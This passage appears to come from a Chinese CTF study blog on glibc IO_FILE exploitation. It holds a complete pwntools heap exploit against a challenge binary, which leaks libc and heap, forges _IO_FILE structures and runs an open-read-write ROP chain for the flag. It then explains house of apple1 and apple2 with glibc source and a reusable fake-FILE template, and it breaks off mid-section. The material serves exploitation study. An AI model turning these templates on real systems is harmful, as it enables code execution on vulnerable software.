<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230209145150731.png"><span class="image-caption">image-20230209145150731</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>binary = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(binary)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    p = process(binary)<br>    libc = elf.libc<br>    <br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;127&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ROL</span>(<span class="hljs-params">content, key</span>):</span>   <br>    tmp = <span class="hljs-built_in">bin</span>(content)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">64</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(tmp[key:] + tmp[:key], <span class="hljs-number">2</span>) <br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx, size</span>):</span><br>    opcode = p8(<span class="hljs-number">1</span>) + p8(idx) + p16(size) <br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    opcode = p8(<span class="hljs-number">4</span>) + p8(idx) + p16(<span class="hljs-built_in">len</span>(content)) + content<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    opcode = p8(<span class="hljs-number">3</span>) + p8(idx)<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    opcode = p8(<span class="hljs-number">2</span>) + p8(idx)<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">runOpcode</span>(<span class="hljs-params">opcode</span>):</span><br>    opcode += p8(<span class="hljs-number">5</span>) <br>    p.sendafter(<span class="hljs-string">b&quot;Pls input the opcode\n&quot;</span>, opcode)<br><br><br>payload = add(<span class="hljs-number">0</span>, <span class="hljs-number">0x410</span>) <span class="hljs-comment"># 0</span><br>payload += add(<span class="hljs-number">1</span>, <span class="hljs-number">0x410</span>) <span class="hljs-comment"># 1</span><br>payload += add(<span class="hljs-number">2</span>, <span class="hljs-number">0x420</span>) <span class="hljs-comment"># 2</span><br>payload += add(<span class="hljs-number">3</span>, <span class="hljs-number">0x410</span>) <span class="hljs-comment"># 3</span><br>payload += free(<span class="hljs-number">2</span>)<br>payload += add(<span class="hljs-number">4</span>, <span class="hljs-number">0x430</span>) <span class="hljs-comment"># 4</span><br>payload += show(<span class="hljs-number">2</span>)<br>runOpcode(payload)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0d0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br><br>payload = edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>payload += show(<span class="hljs-number">2</span>)<br>runOpcode(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2ae0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>stderr = leak + <span class="hljs-number">0x21a860</span><br>payload = free(<span class="hljs-number">0</span>)<br>payload += edit(<span class="hljs-number">2</span>, p64(leak + <span class="hljs-number">0x21a0d0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x2ae0</span>) + p64(stderr-<span class="hljs-number">0x20</span>))<br>payload += add(<span class="hljs-number">5</span>, <span class="hljs-number">0x430</span>) <span class="hljs-comment"># 5</span><br>runOpcode(payload)<br><br>pointer_guard = leak - <span class="hljs-number">0x2890</span><br>_IO_wstrn_jumps = leak + <span class="hljs-number">0x215dc0</span><br>fake_IO_FILE = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base + <span class="hljs-number">0x26c0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(pointer_guard)  <span class="hljs-comment"># _wide_data </span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_wstrn_jumps - <span class="hljs-number">0x20</span>)  <span class="hljs-comment"># vtable</span><br>payload = edit(<span class="hljs-number">2</span>, p64(leak + <span class="hljs-number">0x21a0d0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x2ae0</span>)*<span class="hljs-number">2</span>)<br>payload += add(<span class="hljs-number">6</span>, <span class="hljs-number">0x420</span>)<br>payload += edit(<span class="hljs-number">2</span>, fake_IO_FILE)<br>runOpcode(payload)<br><br><br>setcontext = leak + <span class="hljs-number">0x53a6d</span><br>gadget = leak + <span class="hljs-number">0x00000000001675b0</span> <span class="hljs-comment"># mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br><br>_IO_cookie_jumps = leak + <span class="hljs-number">0x215b80</span><br>fake_IO_FILE = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_cookie_jumps + <span class="hljs-number">0x40</span>)  <span class="hljs-comment"># vtable</span><br>fake_IO_FILE += p64(heap_base + <span class="hljs-number">0x2f20</span>)  <span class="hljs-comment"># rdiValue</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(ROL(gadget ^ (heap_base + <span class="hljs-number">0x2bd0</span>), <span class="hljs-number">0x11</span>)) <span class="hljs-comment"># call func</span><br>payload = edit(<span class="hljs-number">1</span>, fake_IO_FILE)<br>runOpcode(payload)<br><br><span class="hljs-built_in">open</span> = libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>] + leak<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + leak <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + leak<br>ret = leak + <span class="hljs-number">0x0000000000029cd6</span><br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + leak<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + leak<br>pop_rdx = leak + <span class="hljs-number">0x000000000011f497</span> <span class="hljs-comment"># pop rdx ; pop r12 ; ret</span><br>chunk_addr = heap_base + <span class="hljs-number">0x2f10</span> + <span class="hljs-number">0x10</span><br>flag_addr = chunk_addr + <span class="hljs-number">0x10</span><br>rop_addr = chunk_addr + <span class="hljs-number">0xb0</span><br>rop = p64(<span class="hljs-number">0</span>) + p64(chunk_addr) + <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>rop += p64(<span class="hljs-number">0</span>) + p64(setcontext)    <br>rop = rop.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>rop += p64(rop_addr) + p64(ret)<br>rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> +  p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> + p64(write)<br>payload = edit(<span class="hljs-number">3</span>, rop)<br>runOpcode(payload)<br><br>payload = add(<span class="hljs-number">7</span>, <span class="hljs-number">0x410</span>) <span class="hljs-comment"># 7</span><br>payload += add(<span class="hljs-number">8</span>, <span class="hljs-number">0x430</span>) <span class="hljs-comment"># 8</span><br>payload += free(<span class="hljs-number">5</span>)<br>payload += add(<span class="hljs-number">9</span>, <span class="hljs-number">0x410</span>) <span class="hljs-comment"># 9</span><br><br>payload += free(<span class="hljs-number">8</span>)<br>payload += edit(<span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;&#x27;</span>.ljust(<span class="hljs-number">0x428</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0x470</span>))<br>runOpcode(payload)<br>debug()<br><br>payload = add(<span class="hljs-number">10</span>, <span class="hljs-number">0x500</span>) <span class="hljs-comment"># 10</span><br>runOpcode(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h3><p>适用版本 glibc-2.36 及以下</p>
<p>攻击前提：</p>
<ol>
<li>程序从 main 函数返回或能调用 exit 函数</li>
<li>能泄露出 heap 地址和 libc 地址</li>
<li>只需要一次可以往任意地址写可控地址的机会</li>
</ol>
<h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>对 _IO_FILE 中偏移为 0xa0 的成员：struct _IO_wide_data *_wide_data 的利用，相关源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">wint_t</span><br>_IO_wstrn_overflow (FILE *fp, <span class="hljs-keyword">wint_t</span> c)<br>&#123;<br>  <span class="hljs-comment">/* When we come to here this means the user supplied buffer is</span><br><span class="hljs-comment">     filled.  But since we must return the number of characters which</span><br><span class="hljs-comment">     would have been written in total we must provide a buffer for</span><br><span class="hljs-comment">     further use.  We can do this by writing on and on in the overflow</span><br><span class="hljs-comment">     buffer in the _IO_wstrnfile structure.  */</span><br>  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;  <span class="hljs-comment">// 由 fp 强制转换出的结构体</span><br> <br>  <span class="hljs-keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)  <span class="hljs-comment">// 需要满足，但是布局时都不会成立</span><br>    &#123;<br>      _IO_wsetb (fp, snf-&gt;overflow_buf,   <br>         snf-&gt;overflow_buf + (<span class="hljs-keyword">sizeof</span> (snf-&gt;overflow_buf)    <span class="hljs-comment">// 需要注意绕过</span><br>                      / <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">wchar_t</span>)), <span class="hljs-number">0</span>);<br> <br>      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf; <br>      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;<br>      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;<br>      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf<br>                      + (<span class="hljs-keyword">sizeof</span> (snf-&gt;overflow_buf)<br>                     / <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">wchar_t</span>)));<br>    &#125;<br> <br>  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;<br>  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;<br> <br>  <span class="hljs-comment">/* Since we are not really interested in storing the characters</span><br><span class="hljs-comment">     which do not fit in the buffer we simply ignore it.  */</span><br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>控制了 fp 指针，伪造 _wide_data，那么<code>_IO_write_base</code>、<code>_IO_read_base</code>、<code>_IO_read_ptr</code>和<code>_IO_read_end</code>、<code>_IO_write_ptr</code>、<code>_IO_write_end</code>都可以被赋值为<code>snf-&gt;overflow_buf</code>或者与该地址一定范围内偏移的值。</p>
<p>最终就可以达到：<strong>任意的已知地址写入任意的已知地址</strong>。</p>
<p>有段需要绕过的地方，满足 _IO_buf_base 为 0 即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_wsetb (FILE *f, <span class="hljs-keyword">wchar_t</span> *b, <span class="hljs-keyword">wchar_t</span> *eb, <span class="hljs-keyword">int</span> a)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="hljs-comment">// _IO_buf_base不为0的时候不要执行到这里</span><br>  f-&gt;_wide_data-&gt;_IO_buf_base = b;<br>  f-&gt;_wide_data-&gt;_IO_buf_end = eb;<br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>_IO_wstrnfile</code>涉及到的结构体如下，其中，<code>overflow_buf</code>相对于<code>_IO_FILE</code>结构体的偏移为<code>0xf0</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_str_fields</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_alloc_type _allocate_buffer_unused;<br>  _IO_free_type _free_buffer_unused;<br>&#125;;<br> <br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_streambuf</span></span><br><span class="hljs-class">&#123;</span><br>  FILE _f;<br>  <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br> <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_strfile_</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_streambuf</span> _<span class="hljs-title">sbf</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_str_fields</span> _<span class="hljs-title">s</span>;</span><br>&#125; _IO_strfile;<br> <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_strfile f;<br>  <span class="hljs-comment">/* This is used for the characters which do not fit in the buffer</span><br><span class="hljs-comment">     provided by the user.  */</span><br>  <span class="hljs-keyword">char</span> overflow_buf[<span class="hljs-number">64</span>];<br>&#125; _IO_strnfile;<br> <br> <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_strfile f;<br>  <span class="hljs-comment">/* This is used for the characters which do not fit in the buffer</span><br><span class="hljs-comment">     provided by the user.  */</span><br>  <span class="hljs-keyword">wchar_t</span> overflow_buf[<span class="hljs-number">64</span>]; <span class="hljs-comment">// 上面提到的 overflow_buf 在这里********</span><br>&#125; _IO_wstrnfile;<br></code></pre></td></tr></table></figure>

<p>而<code>struct _IO_wide_data</code>结构体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_read_ptr;    <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_read_end;    <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_read_base;    <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_write_base;    <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_write_ptr;    <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_write_end;    <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_buf_base;    <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_buf_end;        <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_save_base;    <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_backup_base;    <span class="hljs-comment">/* Pointer to first valid character of</span><br><span class="hljs-comment">                   backup area */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_save_end;    <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-keyword">__mbstate_t</span> _IO_state;<br>  <span class="hljs-keyword">__mbstate_t</span> _IO_last_state;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> _<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-keyword">wchar_t</span> _shortbuf[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *_<span class="hljs-title">wide_vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>因此，整个利用为：将一个可控堆块劫持到 IO 中，并且知道其地址为 A，将 A + 0xd8 修改为 _IO_wstrn_jumps，并将  A + 0xa0 设置为目标地址 B， 其他的值按照以往的 IO 进行布置。那么触发 FSOP 时，会一路调用到 _IO_wstrn_overflow 函数，并 B 至 B + 0x38 的地址区域的内容都替换为 A + 0xf0 或者 A + 0x1f0。</p>
<p>模板：</p>
<p>_IO_wstrn_jumps = _IO_str_jumps - 0x900</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">_IO_wstrn_jumps = leak + libc.sym[<span class="hljs-string">&#x27;_IO_wstrn_jumps&#x27;</span>]<br>fake_IO_FILE = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_write_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffffffff</span>)  <span class="hljs-comment"># _IO_write_ptr</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_base</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _IO_buf_end</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(next_chain)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(target)  <span class="hljs-comment"># _wide_data </span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _mode = 0</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(_IO_wstrn_jumps)  <span class="hljs-comment"># vtable</span><br></code></pre></td></tr></table></figure>

<p>利用思路：</p>
<ol>
<li>house of apple + house of pig：利用第一个伪造的 Fake_IO 构造  house of apple 去劫持 tcache 结构体，将其劫持为可控的地址，从而控制 tcache bin 的分配，然后再伪造第二个 Fake_IO 构造 house of pig 达成里面的 malloc 分配，利用 memcpy 进行写任意值。</li>
<li>跟第一个方法基本一致，只是  house of apple 去劫持 mp_ 结构体，让所有堆块都可以进入 tcache bin 中，坏处是要多布置一个堆块，因为要先用一次 house of pig 的 free 将一个堆块释放进入 tcache bin，好处是 mp_ 是全局变量，远程是一致的，但是 tcache 结构体是 tls 里的，可能需要爆破。</li>
<li>house of apple + house of emma：先用 hosue of apple 修改 pointer_guard 的值，然后第二个 Fake_IO 触发 house of emma</li>
<li>攻击 global_max_fast，但是这个要能释放很大的 size，然后走的路也是上面的，大同小异。</li>
</ol>
<h3 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h3><p>攻击前提：</p>
<ol>
<li>能控制程序执行 IO 操作：从 main 函数返回、调用 exit 函数、通过 __malloc_assert 触发</li>
<li>能泄露出 heap 地址和 libc 地址</li>
<li>只需要一次可以往任意地址写可控地址的机会</li>
</ol>
<p>这边提一下：如果是通过 __malloc_assert 触发攻击，那么调用 vtable 时的偏移是 0x38，而 FSOP 是 0x18。</p>
<h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>观察<code>struct _IO_wide_data</code>结构体，发现其对应有一个<code>_wide_vtable</code>成员。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_read_ptr;    <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_read_end;    <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_read_base;    <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_write_base;    <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_write_ptr;    <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_write_end;    <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_buf_base;    <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_buf_end;        <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_save_base;    <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_backup_base;    <span class="hljs-comment">/* Pointer to first valid character of</span><br><span class="hljs-comment">                   backup area */</span><br>  <span class="hljs-keyword">wchar_t</span> *_IO_save_end;    <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-keyword">__mbstate_t</span> _IO_state;<br>  <span class="hljs-keyword">__mbstate_t</span> _IO_last_state;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> _<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-keyword">wchar_t</span> _shortbuf[<span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *_<span class="hljs-title">wide_vtable</span>;</span>    <span class="hljs-comment">//&lt;=========这</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，以<code>vtable-&gt;_overflow</code>调用为例，所用到的宏依次为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span><br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span><br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span><br><span class="hljs-meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span><br></code></pre></td></tr></table></figure>

<p>可以看到，在调用<code>_wide_vtable</code>里面的成员函数指针时，<strong>没有关于vtable的合法性检查</strong>。</p>
<p>原文中提及了三个函数可以利用，但是本着道理都差不多的缘故，掌握一个即可，这边选取的是<code>_IO_wfile_overflow</code>。其函数调用链如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">_IO_wfile_overflow<br>    _IO_wdoallocbuf<br>        _IO_WDOALLOCATE<br>            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="hljs-number">0x68</span>)(fp)<br></code></pre></td></tr></table></figure>

<p>_IO_wfile_overflow 源码如下：</p>
